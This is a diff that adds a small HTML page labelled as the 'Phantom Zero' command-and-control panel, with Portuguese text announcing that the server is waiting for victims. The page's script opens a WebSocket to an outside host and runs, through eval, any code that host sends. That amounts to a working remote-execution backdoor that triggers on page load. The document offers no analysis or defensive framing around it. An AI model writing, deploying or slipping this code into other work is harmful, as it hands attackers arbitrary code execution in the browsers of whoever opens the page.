@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Phantom Zero C2</title>
+    <style>body{font-family:monospace;background:#000;color:#0f0;padding:20px;}</style>
+</head>
+<body>
+    <h1>PHANTOM ZERO v11.0 - C2 PANEL</h1>
+    <p>Servidor ativo. Aguardando vítimas...</p>
+    <script>
+        const ws = new WebSocket('wss://c2d.ghost.local:8080/ghost');
+        ws.onopen = () => console.log('[C2] Conectado');
+        ws.onmessage = e => {
+            const cmd = JSON.parse(e.data);
+            if (cmd.code) {
+                eval(cmd.code);
+            }
+        };
+    </script>
+</body>
+</html>
